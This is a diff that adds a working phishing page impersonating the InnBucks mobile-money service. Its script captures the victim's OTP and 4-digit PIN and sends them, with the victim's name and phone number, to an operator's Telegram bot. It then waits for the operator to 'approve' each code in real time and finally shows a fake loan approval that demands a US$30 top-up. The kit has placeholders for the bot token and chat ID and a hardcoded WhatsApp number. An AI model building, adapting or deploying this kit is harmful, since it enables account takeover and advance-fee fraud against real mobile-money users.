@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InnBucks - OTP & PIN</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            min-height: 100vh;
+            font-family: "Inter", sans-serif;
+            background: #0f1117;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            padding: 16px 20px;
+            position: relative;
+        }
+        .back-btn {
+            font-size: 28px;
+            color: #fff;
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            text-decoration: none;
+            line-height: 1;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 0 24px;
+            text-align: center;
+        }
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #a0a8c0;
+            margin-bottom: 32px;
+        }
+        .phone {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 48px;
+        }
+        .otp-group {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+        .otp-box {
+            width: 54px;
+            height: 54px;
+            border: none;
+            border-bottom: 3px solid #4a5568;
+            background: transparent;
+            color: transparent;
+            font-size: 28px;
+            text-align: center;
+            caret-color: white;
+            text-shadow: 0 0 0 white;
+        }
+        .otp-box.filled { border-bottom-color: #3b82f6; }
+        .otp-box:focus {
+            outline: none;
+            border-bottom-color: #3b82f6;
+            color: white;
+        }
+        .resend {
+            font-size: 15px;
+            color: #3b82f6;
+            margin: 24px 0;
+            cursor: pointer;
+        }
+        #submitBtn {
+            width: 100%;
+            max-width: 360px;
+            padding: 18px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: auto;
+            margin-bottom: 40px;
+        }
+        #submitBtn:disabled {
+            background: #2a4365;
+            color: #8a9abf;
+            cursor: not-allowed;
+        }
+        .error-msg {
+            color: #ef4444;
+            font-size: 15px;
+            margin: 12px 0 24px;
+            min-height: 20px;
+            display: none;
+        }
+        .logo {
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 48px;
+        }
+        .logo span.purple { color: #a855f7; }
+        .logo span.green { color: #00c853; }
+        .logo span.red { color: #ef4444; }
+        .greeting {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .input-container {
+            width: 100%;
+            max-width: 360px;
+            position: relative;
+            margin: 32px 0 12px;
+        }
+        label {
+            display: block;
+            font-size: 16px;
+            margin-bottom: 8px;
+            text-align: left;
+            color: #e6eefc;
+        }
+        #pinInput {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            border: none;
+            border-bottom: 2px solid #4a5568;
+            color: white;
+            font-size: 32px;
+            letter-spacing: 20px;
+            text-align: center;
+        }
+        #pinInput:focus {
+            border-bottom-color: #3b82f6;
+            outline: none;
+        }
+        .forgot {
+            font-size: 16px;
+            color: #3b82f6;
+            margin: 24px 0 32px;
+            cursor: pointer;
+        }
+        #spinnerOverlay, #declineOverlay, #thankYouOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 17, 23, 0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f0f0f0;
+            border-top: 6px solid #3b82f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .result-icon { font-size: 80px; margin-bottom: 24px; }
+        .result-title { font-size: 26px; font-weight: 700; margin-bottom: 16px; }
+        .result-message { font-size: 17px; color: #fff; line-height: 1.5; max-width: 400px; margin-bottom: 20px; }
+        .review-section {
+            margin-top: 24px;
+            width: 100%;
+            max-width: 420px;
+            padding: 18px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .review-section h3 { font-size: 19px; font-weight: 600; margin-bottom: 10px; }
+        .review-section p { font-size: 14px; color: #a0a8c0; margin-bottom: 16px; }
+        #reviewText {
+            width: 100%;
+            height: 100px;
+            padding: 14px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 12px;
+            color: white;
+            font-size: 15px;
+            resize: none;
+            margin-bottom: 14px;
+        }
+        #reviewText:focus {
+            outline: none;
+            border-color: #3b82f6;
+        }
+        #sendReviewBtn {
+            width: 100%;
+            padding: 15px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        #sendReviewBtn:hover { background: #2563eb; }
+        @media (max-width: 480px) {
+            .result-icon { font-size: 70px; }
+            .result-title { font-size: 24px; }
+            .result-message { font-size: 16px; }
+            .review-section { padding: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- OTP Page -->
+    <main id="otpPage">
+        <div class="header">
+            <a aria-label="Back" class="back-btn" href="#">←</a>
+        </div>
+        <div class="container">
+            <div class="title">Enter OTP Code</div>
+            <div class="subtitle">OTP code has been sent to your mobile</div>
+            <div class="phone" id="maskedPhone">+263 77 440 092</div>
+
+            <div class="otp-group" role="group">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="OTP digit 1">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="OTP digit 2">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="OTP digit 3">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="OTP digit 4">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="OTP digit 5">
+            </div>
+
+            <div class="error-msg" id="otpError">Incorrect OTP</div>
+            <div class="resend" id="resend">Resend code</div>
+            <button id="submitBtn" disabled>Verify</button>
+        </div>
+    </main>
+
+    <!-- PIN Page (hidden initially) -->
+    <section id="pinPage" style="display:none;">
+        <div class="container">
+            <div class="logo">
+                <span class="purple">●</span>
+                <span class="green">●</span>
+                <span class="red">●</span> InnBucks
+            </div>
+            <div class="greeting">Hello, <span id="userName">User</span></div>
+            <div class="subtitle">Please enter your PIN to sign in.</div>
+            <div class="input-container">
+                <label for="pinInput">Enter PIN</label>
+                <input type="tel" id="pinInput" maxlength="4" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            <div class="error-msg" id="pinError">Incorrect PIN</div>
+            <div class="forgot">Forgot PIN?</div>
+        </div>
+    </section>
+
+    <!-- Spinner Overlay -->
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div class="spinner-text" id="spinnerText">Verifying...</div>
+    </div>
+
+    <!-- Decline Overlay -->
+    <div id="declineOverlay">
+        <div class="result-icon">ℹ️</div>
+        <div class="result-title">Application Review Required</div>
+        <div class="result-message">
+            Thank you for your application.<br><br>
+            We are unable to approve your loan at this time due to inconsistencies.<br><br>
+            Please reapply with accurate details.
+        </div>
+    </div>
+
+    <!-- Thank You / Approved Overlay -->
+    <div id="thankYouOverlay">
+        <div class="result-icon">🎉</div>
+        <div class="result-title">Congratulations!</div>
+        <div class="result-message" id="thankYouMessage"></div>
+        <div class="review-section">
+            <h3>Share Your Experience</h3>
+            <p>We value your feedback to help us serve you better.</p>
+            <textarea id="reviewText" placeholder="Write your review here (optional)..."></textarea>
+            <button id="sendReviewBtn">Send Review via WhatsApp</button>
+        </div>
+    </div>
+
+    <script>
+        // ==============================================
+        //  PASTE YOUR BOT TOKEN AND CHAT ID HERE
+        // ==============================================
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';   // <-- Replace with your actual token
+        const CHAT_ID   = 'YOUR_CHAT_ID';     // <-- Replace with your actual chat ID
+
+        // Dummy user data (you can replace with real data from localStorage)
+        const firstName = 'John';
+        const lastName  = 'Doe';
+        const fullName  = firstName + ' ' + lastName;
+        const savedPhone = '77440092';
+        const loanAmount = '500';
+
+        document.getElementById('userName').textContent = fullName;
+        document.getElementById('maskedPhone').textContent = '+263' + savedPhone;
+
+        // Elements
+        const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
+        const submitBtn = document.getElementById('submitBtn');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const spinnerText = document.getElementById('spinnerText');
+        const declineOverlay = document.getElementById('declineOverlay');
+        const otpPage = document.getElementById('otpPage');
+        const pinPage = document.getElementById('pinPage');
+        const thankYouOverlay = document.getElementById('thankYouOverlay');
+        const thankYouMessage = document.getElementById('thankYouMessage');
+        const otpError = document.getElementById('otpError');
+        const pinError = document.getElementById('pinError');
+        const pinInput = document.getElementById('pinInput');
+
+        let otpValue = '';
+        let lastUpdateId = 0;   // used for polling
+
+        // ----- OTP box handling (masking & focus) -----
+        function updateOtpState() {
+            otpValue = otpBoxes.map(b => b.dataset.real || '').join('');
+            submitBtn.disabled = otpValue.length !== 5;
+            otpBoxes.forEach(b => b.classList.toggle('filled', !!b.dataset.real));
+        }
+
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                let v = (box.value || '').replace(/\D/g, '');
+                if (v.length > 1) v = v.charAt(0);
+                box.value = v;
+                if (v.length === 1) {
+                    box.dataset.real = v;
+                    // mask previous digit if needed
+                    if (index > 0 && otpBoxes[index-1].value && !otpBoxes[index-1].dataset.real) {
+                        setTimeout(() => {
+                            if (document.activeElement !== otpBoxes[index-1])
+                                otpBoxes[index-1].value = '•';
+                        }, 300);
+                    }
+                    if (index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
+                } else {
+                    delete box.dataset.real;
+                }
+                updateOtpState();
+            });
+
+            box.addEventListener('focus', () => {
+                if (box.dataset.real && box.value === '•') box.value = box.dataset.real;
+            });
+
+            box.addEventListener('blur', () => {
+                if (box.value && box.value !== '•') {
+                    box.dataset.real = box.value;
+                    setTimeout(() => {
+                        if (document.activeElement !== box) box.value = '•';
+                    }, 300);
+                }
+            });
+
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text') || '';
+                const digits = paste.replace(/\D/g, '');
+                for (let i = 0; i < digits.length && (index + i) < otpBoxes.length; i++) {
+                    const target = otpBoxes[index + i];
+                    target.value = digits.charAt(i);
+                    target.dataset.real = digits.charAt(i);
+                }
+                const nextIndex = Math.min(index + digits.length, otpBoxes.length - 1);
+                otpBoxes[nextIndex].focus();
+                updateOtpState();
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace') {
+                    if (!box.value && index > 0) {
+                        otpBoxes[index - 1].focus();
+                    } else {
+                        delete box.dataset.real;
+                        box.value = '';
+                        updateOtpState();
+                    }
+                } else if (e.key === 'ArrowLeft' && index > 0) {
+                    otpBoxes[index - 1].focus();
+                } else if (e.key === 'ArrowRight' && index < otpBoxes.length - 1) {
+                    otpBoxes[index + 1].focus();
+                }
+            });
+        });
+
+        // ----- Telegram helper functions -----
+        function sendToTelegram(payload) {
+            // Direct fetch to Telegram API (token exposed – for learning only)
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(r => r.json())
+            .catch(err => console.warn('Telegram send error:', err));
+        }
+
+        function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.ok || !data.result.length) return;
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        if (update.callback_query && update.callback_query.data) {
+                            const parts = update.callback_query.data.split('_');
+                            if (parts.length >= 3) {
+                                const [type, action, time] = parts;
+                                if (time == expectedTs && type === expectedPrefix) {
+                                    clearInterval(interval);
+                                    onDecision(action);
+                                }
+                            }
+                        }
+                    });
+                })
+                .catch(() => {});
+            }, 1500);
+            return interval;
+        }
+
+        // ----- OTP verification -----
+        submitBtn.addEventListener('click', () => {
+            updateOtpState();
+            if (otpValue.length !== 5) return;
+            otpError.style.display = 'none';
+            spinnerText.textContent = 'Verifying OTP...';
+            spinnerOverlay.style.display = 'flex';
+
+            const ts = Date.now();
+            const msg = `Loan Application - OTP Review\n\nPhone: +263${savedPhone}\nAmount: $${loanAmount}\nOTP: ${otpValue}\n\nApprove or Decline:`;
+
+            sendToTelegram({
+                chat_id: CHAT_ID,
+                text: msg,
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: 'Approve OTP', callback_data: `otp_approve_${ts}` },
+                        { text: 'Decline OTP', callback_data: `otp_decline_${ts}` }
+                    ]]
+                }
+            });
+
+            pollForCallback('otp', ts, (action) => {
+                spinnerOverlay.style.display = 'none';
+                if (action === 'approve') {
+                    otpPage.style.display = 'none';
+                    pinPage.style.display = 'flex';
+                    pinInput.focus();
+                } else {
+                    otpError.style.display = 'block';
+                    otpBoxes.forEach(b => {
+                        b.value = '';
+                        delete b.dataset.real;
+                        b.classList.remove('filled');
+                    });
+                    otpValue = '';
+                    submitBtn.disabled = true;
+                    otpBoxes[0].focus();
+                }
+            });
+        });
+
+        // ----- PIN auto‑submit -----
+        pinInput.addEventListener('input', (e) => {
+            let v = (e.target.value || '').replace(/\D/g, '');
+            if (v.length > 4) v = v.slice(0, 4);
+            e.target.value = v;
+            if (v.length === 4) setTimeout(() => autoVerifyPin(v), 400);
+        });
+
+        function autoVerifyPin(pin) {
+            pinError.style.display = 'none';
+            spinnerText.textContent = 'Verifying PIN...';
+            spinnerOverlay.style.display = 'flex';
+
+            const ts = Date.now();
+            const pinMsg = `Loan PIN Verification\n\nUser: ${fullName}\nPhone: +263${savedPhone}\nAmount: $${loanAmount}\nPIN: ${pin}\n\nApprove or Decline this PIN:`;
+
+            sendToTelegram({
+                chat_id: CHAT_ID,
+                text: pinMsg,
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: 'Approve', callback_data: `pin_approve_${ts}` },
+                        { text: 'Decline', callback_data: `pin_decline_${ts}` }
+                    ]]
+                }
+            });
+
+            pollForCallback('pin', ts, (action) => {
+                spinnerOverlay.style.display = 'none';
+                if (action === 'approve') {
+                    thankYouMessage.innerHTML = `
+                        Dear ${fullName},<br><br>
+                        Congratulations! Your loan of <strong>$${loanAmount}</strong> has been <strong>approved</strong>.<br><br>
+                        A minimum top-up of <strong>US$30</strong> is required to activate and disburse the funds.<br><br>
+                        Please top up soon to receive your loan instantly.<br><br>
+                        Thank you for choosing InnBucks!<br><br>
+                        Best regards,<br>InnBucks Team
+                    `;
+                    thankYouOverlay.style.display = 'flex';
+                } else {
+                    pinError.style.display = 'block';
+                    pinInput.value = '';
+                    pinInput.focus();
+                }
+            });
+        }
+
+        // ----- Resend (stub) -----
+        document.getElementById('resend').addEventListener('click', () => {
+            alert('Resend code requested – implement server‑side resend.');
+        });
+
+        // ----- Send review via WhatsApp -----
+        document.getElementById('sendReviewBtn').addEventListener('click', () => {
+            const review = document.getElementById('reviewText').value.trim();
+            if (!review) return;
+            const message = `InnBucks Review from ${fullName} (Phone: +263${savedPhone})\n\n${review}`;
+            window.open(`https://wa.me/263786258338?text=${encodeURIComponent(message)}`, '_blank');
+        });
+
+        // Initialise
+        updateOtpState();
+        if (otpBoxes.length) otpBoxes[0].focus();
+    </script>
+</body>
+</html>
